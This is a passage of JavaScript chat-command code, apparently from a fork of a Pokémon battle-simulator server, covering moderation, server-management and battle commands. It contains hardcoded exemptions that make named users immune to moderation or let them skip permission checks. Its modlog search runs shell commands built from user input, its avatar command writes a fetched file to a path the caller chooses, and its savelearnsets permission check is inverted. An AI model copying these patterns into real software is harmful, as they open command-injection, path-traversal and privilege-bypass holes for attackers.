			this.addModCommand(""+targetUser.name+"'s alts were also unbanned from room " + room.id + ": "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				var altId = toId(alts[i]);
				if (room.bannedUsers[altId]) delete room.bannedUsers[altId];
			}
		}
	},

	leave: 'part',
	part: function(target, room, user, connection) {
		if (room.id === 'global') return false;
		var targetRoom = Rooms.get(target);
		if (target && !targetRoom) {
			return this.sendReply("The room '"+target+"' does not exist.");
		}
		user.leaveRoom(targetRoom || room, connection);
	},

	/*********************************************************
	 * Moderating: Punishments
	 *********************************************************/

	warn: function(target, room, user) {
		if (!target) return this.parse('/help warn');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (room.isPrivate && room.auth) {
			return this.sendReply('You can\'t warn here: This is a privately-owned room not subject to global rules.');
		}
		if (!this.can('warn', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be banned');;

		this.addModCommand(''+targetUser.name+' was warned by '+user.name+'.' + (target ? " (" + target + ")" : ""));
		targetUser.send('|c|~|/warn '+target);	
	},

	kickto: 'redir',
	redirect: 'redir',
	redir: function (target, room, user, connection) {
		if (!target) return this.parse('/help redirect');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		var targetRoom = Rooms.get(target) || Rooms.get(toId(target));
		if (!targetRoom) {
			return this.sendReply("/help redir - You need to add a room to redirect the user to");
		}
		if (!this.can('kick', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be banned');
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (Rooms.rooms[targetRoom.id].users[targetUser.userid]) {
			return this.sendReply("User " + targetUser.name + " is already in the room " + target + "!");
		}
		if (!Rooms.rooms[room.id].users[targetUser.userid]) {
			return this.sendReply('User '+this.targetUsername+' is not in the room ' + room.id + '.');
		}
		if (targetUser.joinRoom(target) === false) return this.sendReply('User "' + targetUser.name + '" could not be joined to room ' + target + '. They could be banned from the room.');
		var roomName = (targetRoom.isPrivate)? 'a private room' : 'room ' + target;
		this.addModCommand(targetUser.name + ' was redirected to ' + roomName + ' by ' + user.name + '.');
		targetUser.leaveRoom(room);
	},

	m: 'mute',
	mute: function(target, room, user) {
		if (!target) return this.parse('/help mute');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('mute', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted');
		if (targetUser.mutedRooms[room.id] || targetUser.locked || !targetUser.connected) {
			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
			if (!target) {
				return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
			}
			return this.addModCommand(''+targetUser.name+' would be muted by '+user.name+problem+'.' + (target ? " (" + target + ")" : ""));
		}

		targetUser.popup(user.name+' has muted you for 7 minutes. '+target);
		this.addModCommand(''+targetUser.name+' was muted by '+user.name+' for 7 minutes.' + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also muted: "+alts.join(", "));

		targetUser.mute(room.id, 7*60*1000);
	},

	hm: 'hourmute',
	hourmute: function(target, room, user) {
		if (!target) return this.parse('/help hourmute');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('mute', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted');
		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id]||0) >= 50*60*1000) || targetUser.locked) && !target) {
			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
			return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+' has muted you for 60 minutes. '+target);
		this.addModCommand(''+targetUser.name+' was muted by '+user.name+' for 60 minutes.' + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also muted: "+alts.join(", "));

		targetUser.mute(room.id, 60*60*1000, true);
	},

	um: 'unmute',
	unmute: function(target, room, user) {
		if (!target) return this.parse('/help something');
		if (!this.canTalk() && user.group !== '~') return false;

		var targetid = toUserid(target);
		var targetUser = Users.get(target);
		if (!targetUser) {
			return this.sendReply('User '+target+' not found.');
		}
		if (!this.can('mute', targetUser, room)) return false;

		if (!targetUser.mutedRooms[room.id]) {
			return this.sendReply(''+targetUser.name+' isn\'t muted.');
		}

		this.addModCommand(''+targetUser.name+' was unmuted by '+user.name+'.');

		targetUser.unmute(room.id);
	},

	ipmute: 'lock',
	lock: function(target, room, user) {
		if (!target) return this.parse('/help lock');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUser+' not found.');
		}
		if (!user.can('lock', targetUser)) {
			return this.sendReply('/lock - Access denied.');
		}
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be locked');
		if ((targetUser.locked || Users.checkBanned(targetUser.latestIp)) && !target) {
			var problem = ' but was already '+(targetUser.locked ? 'locked' : 'banned');
			return this.privateModCommand('('+targetUser.name+' would be locked by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+' has locked you from talking in chats, battles, and PMing regular users.\n\n'+target+'\n\nIf you feel that your lock was unjustified, you can still PM staff members (%, @, &, and ~) to discuss it.');

		this.addModCommand(""+targetUser.name+" was locked from talking by "+user.name+"." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also locked: "+alts.join(", "));
		this.add('|unlink|' + targetUser.userid);

		targetUser.lock();
	},

	unlock: function(target, room, user) {
		if (!target) return this.parse('/help unlock');
		if (!this.can('lock')) return false;
		if (!this.canTalk() && user.group !== '~') return false;

		var unlocked = Users.unlock(target);

		if (unlocked) {
			var names = Object.keys(unlocked);
			this.addModCommand('' + names.join(', ') + ' ' +
					((names.length > 1) ? 'were' : 'was') +
					' unlocked by ' + user.name + '.');
		} else {
			this.sendReply('User '+target+' is not locked.');
		}
	},

	b: 'ban',
	ban: function(target, room, user) {
		if (!target) return this.parse('/help ban');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('ban', targetUser)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be banned');
		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			var problem = ' but was already banned';
			return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+" has banned you." + (config.appealurl ? ("  If you feel that your banning was unjustified you can appeal the ban:\n" + config.appealurl) : "") + "\n\n"+target);

		this.addModCommand(""+targetUser.name+" was banned by "+user.name+"." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(""+targetUser.name+"'s alts were also banned: "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				this.add('|unlink|' + toId(alts[i]));
			}
		}

		this.add('|unlink|' + targetUser.userid);
		targetUser.ban();
	},

	unban: function(target, room, user) {
		if (!target) return this.parse('/help unban');
		if (!user.can('ban')) {
			return this.sendReply('/unban - Access denied.');
		}

		var name = Users.unban(target);

		if (name) {
			this.addModCommand(''+name+' was unbanned by '+user.name+'.');
		} else {
			this.sendReply('User '+target+' is not banned.');
		}
	},

	unbanall: function(target, room, user) {
		if (!user.can('ban')) {
			return this.sendReply('/unwhipall - Access denied.');
		}
		// we have to do this the hard way since it's no longer a global
		for (var i in Users.bannedIps) {
			delete Users.bannedIps[i];
		}
		for (var i in Users.lockedIps) {
			delete Users.lockedIps[i];
		}
		this.addModCommand('All whipss and locks have been lifted by '+user.name+'.');
	},

	banip: function(target, room, user) {
		target = target.trim();
		if (!target) {
			return this.parse('/help banip');
		}
		if (!this.can('rangeban')) return false;

		Users.bannedIps[target] = '#ipban';
		this.addModCommand(user.name+' temporarily banned the '+(target.charAt(target.length-1)==='*'?'IP range':'IP')+': '+target);
	},

	unbanip: function(target, room, user) {
		target = target.trim();
		if (!target) {
			return this.parse('/help unbanip');
		}
		if (!this.can('rangeban')) return false;
		if (!Users.bannedIps[target]) {
			return this.sendReply(''+target+' is not a banned IP or IP range.');
		}
		delete Users.bannedIps[target];
		this.addModCommand(user.name+' unbanned the '+(target.charAt(target.length-1)==='*'?'IP range':'IP')+': '+target);
	},

	/*********************************************************
	 * Moderating: Other
	 *********************************************************/

	modnote: function(target, room, user, connection, cmd) {
		if (!target) return this.parse('/help note');
		if (!this.can('mute')) return false;
		return this.privateModCommand('(' + user.name + ' notes: ' + target + ')');
	},

	demote: 'promote',
	promote: function(target, room, user, connection, cmd) {
		if (!target) return this.parse('/help promote');
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var userid = toUserid(this.targetUsername);
		var name = targetUser ? targetUser.name : this.targetUsername;

		var currentGroup = ' ';
		if (targetUser) {
			currentGroup = targetUser.group;
		} else if (Users.usergroups[userid]) {
			currentGroup = Users.usergroups[userid].substr(0,1);
		}

		var nextGroup = target ? target : Users.getNextGroupSymbol(currentGroup, cmd === 'demote', true);
		if (target === 'deauth') nextGroup = config.groupsranking[0];
		if (!config.groups[nextGroup]) {
			return this.sendReply('Group \'' + nextGroup + '\' does not exist.');
		}
		if (!user.checkPromotePermission(currentGroup, nextGroup)) {
			return this.sendReply('/' + cmd + ' - Access denied.');
		}

		var isDemotion = (config.groups[nextGroup].rank < config.groups[currentGroup].rank);
		if (!Users.setOfflineGroup(name, nextGroup)) {
			return this.sendReply('/promote - WARNING: This user is offline and could be unregistered. Use /forcepromote if you\'re sure you want to risk it.');
		}
		var groupName = (config.groups[nextGroup].name || nextGroup || '').trim() || 'a regular user';
		if (isDemotion) {
			this.privateModCommand('('+name+' was demoted to ' + groupName + ' by '+user.name+'.)');
			if (targetUser) {
				targetUser.popup('You were demoted to ' + groupName + ' by ' + user.name + '.');
			}
		} else {
			this.addModCommand(''+name+' was promoted to ' + groupName + ' by '+user.name+'.');
		}
		if (targetUser) {
			targetUser.updateIdentity();
		}
	},

	forcepromote: function(target, room, user) {
		// warning: never document this command in /help
		if (!this.can('forcepromote')) return false;
		var target = this.splitTarget(target, true);
		var name = this.targetUsername;
		var nextGroup = target ? target : Users.getNextGroupSymbol(' ', false);

		if (!Users.setOfflineGroup(name, nextGroup, true)) {
			return this.sendReply('/forcepromote - Don\'t forcepromote unless you have to.');
		}
		var groupName = config.groups[nextGroup].name || nextGroup || '';
		this.addModCommand(''+name+' was promoted to ' + (groupName.trim()) + ' by '+user.name+'.');
	},
	
	regular: 'deuath',
	deauth: function(target, room, user) {
		return this.parse('/demote '+target+', deauth');
	},

	modchat: function(target, room, user) {
		if (!target) {
			return this.sendReply('Moderated chat is currently set to: '+room.modchat);
		}
		if (!this.can('modchat', null, room) || !this.canTalk()) return false;

		target = target.toLowerCase();
		switch (target) {
		case 'on':
		case 'true':
		case 'yes':
		case 'registered':
			this.sendReply("Modchat registered has been removed.");
			this.sendReply("If you're dealing with a spammer, make sure to run /loadbanlist.");
			return false;
			break;
		case 'off':
		case 'false':
		case 'no':
			room.modchat = false;
			break;
		default:
			if (!config.groups[target]) {
				return this.parse('/help modchat');
			}
			if (config.groupsranking.indexOf(target) > 1 && !user.can('modchatall')) {
				return this.sendReply('/modchat - Access denied for setting higher than ' + config.groupsranking[1] + '.');
			}
			room.modchat = target;
			break;
		}
		if (room.modchat === true) {
			this.add('|raw|<div class="broadcast-red"><b>Moderated chat was enabled!</b><br />Only registered users can talk.</div>');
		} else if (!room.modchat) {
			this.add('|raw|<div class="broadcast-blue"><b>Moderated chat was disabled!</b><br />Anyone may talk now.</div>');
		} else {
			var modchat = sanitize(room.modchat);
			this.add('|raw|<div class="broadcast-red"><b>Moderated chat was set to '+modchat+'!</b><br />Only users of rank '+modchat+' and higher can talk.</div>');
		}
		this.logModCommand(user.name+' set modchat to '+room.modchat);
	},

	declare: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-blue"><b>'+target+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	},

	wall: 'announce',
	announce: function(target, room, user) {
		if (!target) return this.parse('/help announce');

		if (!this.can('announce', null, room)) return false;

		target = this.canTalk(target);
		if (!target) return;

		return '/announce '+target;
	},

	fr: 'forcerename',
	forcerename: function(target, room, user) {
		if (!target) return this.parse('/help forcerename');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('forcerename', targetUser)) return false;

		if (targetUser.userid === toUserid(this.targetUser)) {
			var entry = ''+targetUser.name+' was forced to choose a new name by '+user.name+'' + (target ? ": " + target + "" : "");
			this.privateModCommand('(' + entry + ')');
			targetUser.resetName();
			targetUser.send('|nametaken||'+user.name+" has forced you to change your name. "+target);
		} else {
			this.sendReply("User "+targetUser.name+" is no longer using that name.");
		}
	},

	frt: 'forcerenameto',
	forcerenameto: function(target, room, user) {
		if (!target) return this.parse('/help forcerenameto');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!target) {
			return this.sendReply('No new name was specified.');
		}
		if (!this.can('forcerenameto', targetUser)) return false;

		if (targetUser.userid === toUserid(this.targetUser)) {
			var entry = ''+targetUser.name+' was forcibly renamed to '+target+' by '+user.name+'.';
			this.privateModCommand('(' + entry + ')');
			targetUser.forceRename(target, undefined, true);
		} else {
			this.sendReply("User "+targetUser.name+" is no longer using that name.");
		}
	},

	modlog: function(target, room, user, connection) {
		if (!this.can('modlog')) return false;
		var lines = 0;
		if (!target.match('[^0-9]')) {
			lines = parseInt(target || 15, 10);
			if (lines > 100) lines = 100;
		}
		var filename = 'logs/modlog.txt';
		var command = 'tail -'+lines+' '+filename;
		var grepLimit = 100;
		if (!lines || lines < 0) { // searching for a word instead
			if (target.match(/^["'].+["']$/)) target = target.substring(1,target.length-1);
			command = "awk '{print NR,$0}' "+filename+" | sort -nr | cut -d' ' -f2- | grep -m"+grepLimit+" -i '"+target.replace(/\\/g,'\\\\\\\\').replace(/["'`]/g,'\'\\$&\'').replace(/[\{\}\[\]\(\)\$\^\.\?\+\-\*]/g,'[$&]')+"'";
		}

		require('child_process').exec(command, function(error, stdout, stderr) {
			if (error && stderr) {
				connection.popup('/modlog erred - modlog does not support Windows');
				console.log('/modlog error: '+error);
				return false;
			}
			if (lines) {
				if (!stdout) {
					connection.popup('The modlog is empty. (Weird.)');
				} else {
					connection.popup('Displaying the last '+lines+' lines of the Moderator Log:\n\n'+stdout);
				}
			} else {
				if (!stdout) {
					connection.popup('No moderator actions containing "'+target+'" were found.');
				} else {
					connection.popup('Displaying the last '+grepLimit+' logged actions containing "'+target+'":\n\n'+stdout);
				}
			}
		});
	},

	bw: 'banword',
	banword: function(target, room, user) {
		if (!this.can('declare')) return false;
		target = toId(target);
		if (!target) {
			return this.sendReply('Specify a word or phrase to ban.');
		}
		Users.addBannedWord(target);
		this.sendReply('Added \"'+target+'\" to the list of banned words.');
	},

	ubw: 'unbanword',
	unbanword: function(target, room, user) {
		if (!this.can('declare')) return false;
		target = toId(target);
		if (!target) {
			return this.sendReply('Specify a word or phrase to unban.');
		}
		Users.removeBannedWord(target);
		this.sendReply('Removed \"'+target+'\" from the list of banned words.');
	},

	/*********************************************************
	 * Server management commands
	 *********************************************************/

	hotpatch: function(target, room, user) {
		if (!target) return this.parse('/help hotpatch');
		if (!this.can('hotpatch')) return false;

		this.logEntry(user.name + ' used /hotpatch ' + target);

		if (target === 'chat') {

			try {
				CommandParser.uncacheTree('./command-parser.js');
				CommandParser = require('./command-parser.js');
				return this.sendReply('Chat commands have been hot-patched.');
			} catch (e) {
				return this.sendReply('Something failed while trying to hotpatch chat: \n' + e.stack);
			}

		} else if (target === 'battles') {

			Simulator.SimulatorProcess.respawn();
			return this.sendReply('Battles have been hotpatched. Any battles started after now will use the new code; however, in-progress battles will continue to use the old code.');

		} else if (target === 'formats') {
			try {
				// uncache the tools.js dependency tree
				CommandParser.uncacheTree('./tools.js');
				// reload tools.js
				Tools = require('./tools.js'); // note: this will lock up the server for a few seconds
				// rebuild the formats list
				Rooms.global.formatListText = Rooms.global.getFormatListText();
				// respawn simulator processes
				Simulator.SimulatorProcess.respawn();
				// broadcast the new formats list to clients
				Rooms.global.send(Rooms.global.formatListText);

				return this.sendReply('Formats have been hotpatched.');
			} catch (e) {
				return this.sendReply('Something failed while trying to hotpatch formats: \n' + e.stack);
			}

		}
		this.sendReply('Your hot-patch command was unrecognized.');
	},

	hide: function(target, room, user) {
		if (this.can('hide') || user.userid === 'bandi') {
			user.getIdentity = function(){
				if(this.muted)	return '!' + this.name;
				if(this.locked) return '‽' + this.name;
				return ' ' + this.name;
			};
			user.updateIdentity();
			this.sendReply('You have hidden your staff symbol.');
			return false;
		}

	},

	show: function(target, room, user) {
		if (this.can('hide') || user.userid === 'bandi') {
			delete user.getIdentity
			user.updateIdentity();
			this.sendReply('You have revealed your staff symbol');
			return false;
		}
	},

	customavatar: function(target, room, user, connection) {
		if (!this.can('customavatars')) return false;
		if (!target) return connection.sendTo(room, 'Usage: /customavatar URL, filename');
		var http = require('http-get');
		target = target.split(", ");
		http.get(target[0], 'config/avatars/' + target[1], function (error, result) {
		    if (error) {
    		    connection.sendTo(room, '/customavatar - You supplied an invalid URL or file name!');
    		} else {
	    	    connection.sendTo(room, 'File saved to: ' + result.file);
	    	}
		});
	},

	savelearnsets: function(target, room, user) {
		if (this.can('hotpatch')) return false;
		fs.writeFile('data/learnsets.js', 'exports.BattleLearnsets = '+JSON.stringify(BattleLearnsets)+";\n");
		this.sendReply('learnsets.js saved.');
	},

	disableladder: function(target, room, user) {
		if (!this.can('disableladder')) return false;
		if (LoginServer.disabled) {
			return this.sendReply('/disableladder - Ladder is already disabled.');
		}
		LoginServer.disabled = true;
		this.logModCommand('The ladder was disabled by ' + user.name + '.');
		this.add('|raw|<div class="broadcast-red"><b>Due to high server load, the ladder has been temporarily disabled</b><br />Rated games will no longer update the ladder. It will be back momentarily.</div>');
	},

	enableladder: function(target, room, user) {
		if (!this.can('disableladder')) return false;
		if (!LoginServer.disabled) {
			return this.sendReply('/enable - Ladder is already enabled.');
		}
		LoginServer.disabled = false;
		this.logModCommand('The ladder was enabled by ' + user.name + '.');
		this.add('|raw|<div class="broadcast-green"><b>The ladder is now back.</b><br />Rated games will update the ladder now.</div>');
	},

	lockdown: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		Rooms.global.lockdown = true;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-red"><b>The server is restarting soon.</b><br />Please finish your battles quickly. No new battles can be started until the server resets in a few minutes.</div>');
			if (Rooms.rooms[id].requestKickInactive && !Rooms.rooms[id].battle.ended) Rooms.rooms[id].requestKickInactive(user, true);
		}

		this.logEntry(user.name + ' used /lockdown');

	},

	endlockdown: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Rooms.global.lockdown) {
			return this.sendReply("We're not under lockdown right now.");
		}
		Rooms.global.lockdown = false;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-green"><b>The server shutdown was canceled.</b></div>');
		}

		this.logEntry(user.name + ' used /endlockdown');

	},

	kill: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Rooms.global.lockdown) {
			return this.sendReply('For safety reasons, /kill can only be used during lockdown.');
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply('Wait for /updateserver to finish before using /kill.');
		}

		room.destroyLog(function() {
			room.logEntry(user.name + ' used /kill');
		}, function() {
			process.exit();
		});

		// Just in the case the above never terminates, kill the process
		// after 10 seconds.
		setTimeout(function() {
			process.exit();
		}, 10000);
	},

	loadbanlist: function(target, room, user, connection) {
		if (!this.can('hotpatch')) return false;

		connection.sendTo(room, 'Loading ipbans.txt...');
		fs.readFile('config/ipbans.txt', function (err, data) {
			if (err) return;
			data = (''+data).split("\n");
			var count = 0;
			for (var i=0; i<data.length; i++) {
				data[i] = data[i].split('#')[0].trim();
				if (data[i] && !Users.bannedIps[data[i]]) {
					Users.bannedIps[data[i]] = '#ipban';
					count++;
				}
			}
			if (!count) {
				connection.sendTo(room, 'No IPs were banned; ipbans.txt has not been updated since the last time /loadbanlist was called.');
			} else {
				connection.sendTo(room, ''+count+' IPs were loaded from ipbans.txt and banned.');
			}
		});
	},

	refreshpage: function(target, room, user) {
		if (!this.can('hotpatch')) return false;
		Rooms.global.send('|refresh|');
		this.logEntry(user.name + ' used /refreshpage');
	},

	updateserver: function(target, room, user, connection) {
		if (!user.checkConsolePermission(connection)) {
			return this.sendReply('/updateserver - Access denied.');
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply('/updateserver - Another update is already in progress. [This maybe a bug, and will require restart].');
		}

		CommandParser.updateServerLock = true;

		var logQueue = [];
		logQueue.push(user.name + ' used /updateserver');

		connection.sendTo(room, 'updating...');

		var exec = require('child_process').exec;
		exec('git diff-index --quiet HEAD --', function(error) {
			var cmd = 'git pull --rebase';
			if (error) {
				if (error.code === 1) {
					// The working directory or index have local changes.
					cmd = 'git stash;' + cmd + ';git stash pop';
				} else {
					// The most likely case here is that the user does not have
					// `git` on the PATH (which would be error.code === 127).
					connection.sendTo(room, '' + error);
					logQueue.push('' + error);
					logQueue.forEach(function(line) {
						room.logEntry(line);
					});
					CommandParser.updateServerLock = false;
					return;
				}
			}
			var entry = 'Running `' + cmd + '`';
			connection.sendTo(room, entry);
			logQueue.push(entry);
			exec(cmd, function(error, stdout, stderr) {
				('' + stdout + stderr).split('\n').forEach(function(s) {
					connection.sendTo(room, s);
					logQueue.push(s);
				});
				logQueue.forEach(function(line) {
					room.logEntry(line);
				});
				CommandParser.updateServerLock = false;
			});
		});
	},

	crashfixed: function(target, room, user) {
		if (!Rooms.global.lockdown) {
			return this.sendReply('/crashfixed - There is no active crash.');
		}
		if (!this.can('hotpatch')) return false;

		Rooms.global.lockdown = false;
		if (Rooms.lobby) {
			Rooms.lobby.modchat = false;
			Rooms.lobby.addRaw('<div class="broadcast-green"><b>We fixed the crash without restarting the server!</b><br />You may resume talking in the lobby and starting new battles.</div>');
		}
		this.logEntry(user.name + ' used /crashfixed');
	},

	crashlogged: function(target, room, user) {
		if (!Rooms.global.lockdown) {
			return this.sendReply('/crashlogged - There is no active crash.');
		}
		if (!this.can('declare')) return false;

		Rooms.global.lockdown = false;
		if (Rooms.lobby) {
			Rooms.lobby.modchat = false;
			Rooms.lobby.addRaw('<div class="broadcast-green"><b>We have logged the crash and are working on fixing it!</b><br />You may resume talking in the lobby and starting new battles.</div>');
		}
		this.logEntry(user.name + ' used /crashlogged');
	},

	'memusage': 'memoryusage',
	memoryusage: function(target) {
		if (!this.can('hotpatch')) return false;
		target = toId(target) || 'all';
		if (target === 'all') {
			this.sendReply('Loading memory usage, this might take a while.');
		}
		if (target === 'all' || target === 'rooms' || target === 'room') {
			this.sendReply('Calcualting Room size...');
			var roomSize = ResourceMonitor.sizeOfObject(Rooms);
			this.sendReply("Rooms are using " + roomSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'config') {
			this.sendReply('Calculating config size...');
			var configSize = ResourceMonitor.sizeOfObject(config);
			this.sendReply("Config is using " + configSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'resourcemonitor' || target === 'rm') {
			this.sendReply('Calculating Resource Monitor size...');
			var rmSize = ResourceMonitor.sizeOfObject(ResourceMonitor);
			this.sendReply("The Resource Monitor is using " + rmSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'apps' || target === 'app' || target === 'serverapps') {
			this.sendReply('Calculating Server Apps size...');
			var appSize = ResourceMonitor.sizeOfObject(App) + ResourceMonitor.sizeOfObject(AppSSL) + ResourceMonitor.sizeOfObject(Server);
			this.sendReply("Server Apps are using " + appSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'cmdp' || target === 'cp' || target === 'commandparser') {
			this.sendReply('Calculating Command Parser size...');
			var cpSize = ResourceMonitor.sizeOfObject(CommandParser);
			this.sendReply("Command Parser is using " + cpSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'sim' || target === 'simulator') {
			this.sendReply('Calculating Simulator size...');
			var simSize = ResourceMonitor.sizeOfObject(Simulator);
			this.sendReply("Simulator is using " + simSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'users') {
			this.sendReply('Calculating Users size...');
			var usersSize = ResourceMonitor.sizeOfObject(Users);
			this.sendReply("Users is using " + usersSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'tools') {
			this.sendReply('Calculating Tools size...');
			var toolsSize = ResourceMonitor.sizeOfObject(Tools);
			this.sendReply("Tools are using " + toolsSize + " bytes of memory.");
		}
		if (target === 'all') {
			this.sendReply('Calculating Total size...');
			var total = (roomSize + configSize + rmSize + appSize + cpSize + simSize + toolsSize + usersSize) || 0;
			var units = ['bytes', 'K', 'M', 'G'];
			var converted = total;
			var unit = 0;
			while (converted > 1024) {
				converted /= 1024;
				unit++;
			}
			converted = Math.round(converted);
			this.sendReply("Total memory used: " + converted + units[unit] + " (" + total + " bytes).");
		}
		return;
	},

	eval: function(target, room, user, connection, cmd, message) {
		if (!user.checkConsolePermission(connection)) {
			return this.sendReply("/eval - Access denied.");
		}
		if (!this.canBroadcast()) return;

		if (!this.broadcasting) this.sendReply('||>> '+target);
		try {
			var battle = room.battle;
			var me = user;
			this.sendReply('||<< '+eval(target));
		} catch (e) {
			this.sendReply('||<< error: '+e.message);
			var stack = '||'+(''+e.stack).replace(/\n/g,'\n||');
			connection.sendTo(room, stack);
		}
	},

	evalbattle: function(target, room, user, connection, cmd, message) {
		if (!user.checkConsolePermission(connection)) {
			return this.sendReply("/evalbattle - Access denied.");
		}
		if (!this.canBroadcast()) return;
		if (!room.battle) {
			return this.sendReply("/evalbattle - This isn't a battle room.");
		}

		room.battle.send('eval', target.replace(/\n/g, '\f'));
	},

	/*********************************************************
	 * Battle commands
	 *********************************************************/

	concede: 'forfeit',
	surrender: 'forfeit',
	forfeit: function(target, room, user) {
		if (!room.battle) {
			return this.sendReply("There's nothing to forfeit here.");
		}
		if (!room.forfeit(user)) {
			return this.sendReply("You can't forfeit this battle.");
		}
	},

	savereplay: function(target, room, user, connection) {
		if (!room || !room.battle) return;
		var logidx = 2; // spectator log (no exact HP)
		if (room.battle.ended) {
			// If the battle is finished when /savereplay is used, include
			// exact HP in the replay log.
			logidx = 3;
		}
		var data = room.getLog(logidx).join("\n");
		var datahash = crypto.createHash('md5').update(data.replace(/[^(\x20-\x7F)]+/g,'')).digest('hex');

		LoginServer.request('prepreplay', {
			id: room.id.substr(7),
			loghash: datahash,
			p1: room.p1.name,
			p2: room.p2.name,
			format: room.format
		}, function(success) {
			connection.send('|queryresponse|savereplay|'+JSON.stringify({
				log: data,
				id: room.id.substr(7)
			}));
		});
	},

	mv: 'move',
	attack: 'move',
	move: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', 'move '+target);
	},

	sw: 'switch',
	switch: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', 'switch '+parseInt(target,10));
	},

	choose: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', target);
	},

	undo: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'undo', target);
	},

	team: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', 'team '+target);
	},

	joinbattle: function(target, room, user) {
		if (!room.joinBattle) return this.sendReply('You can only do this in battle rooms.');

		room.joinBattle(user);
	},

	partbattle: 'leavebattle',
	leavebattle: function(target, room, user) {
		if (!room.leaveBattle) return this.sendReply('You can only do this in battle rooms.');

		room.leaveBattle(user);
	},

	kickbattle: function(target, room, user) {
		if (!room.leaveBattle) return this.sendReply('You can only do this in battle rooms.');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('kick', targetUser)) return false;

		if (room.leaveBattle(targetUser)) {
			this.addModCommand(''+targetUser.name+' was kicked from a battle by '+user.name+'' + (target ? " (" + target + ")" : ""));
		} else {
			this.sendReply("/kickbattle - User isn\'t in battle.");
		}
	},

	kickinactive: function(target, room, user) {
		if (room.requestKickInactive) {
			room.requestKickInactive(user);
		} else {
			this.sendReply('You can only kick inactive players from inside a room.');
		}
	},

	timer: function(target, room, user) {
		target = toId(target);
		if (room.requestKickInactive) {
			if (target === 'off' || target === 'stop') {
				room.stopKickInactive(user, user.can('timer'));
			} else if (target === 'on' || !target) {
				room.requestKickInactive(user, user.can('timer'));
			} else {
				this.sendReply("'"+target+"' is not a recognized timer state.");
			}
		} else {
